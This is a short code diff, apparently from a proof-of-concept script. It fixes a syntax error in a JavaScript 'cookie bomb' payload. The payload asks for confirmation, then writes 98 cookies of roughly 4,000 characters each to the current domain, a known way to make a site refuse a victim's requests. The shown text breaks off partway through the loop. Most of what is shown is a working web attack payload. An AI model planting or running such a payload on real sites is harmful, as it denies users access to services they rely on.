@@ -1,5 +1,5 @@
 <script>
-	if(confirm(`Should I Cookie Bomb ${document.domain}?``)){
+	if(confirm(`Should I Cookie Bomb ${document.domain}?`)){
 		for(var i=1;i<99;i++){
 			document.cookie = `bomb${i}=${Array(4000).join('a')};Domain=${document.domain}`;
 		};
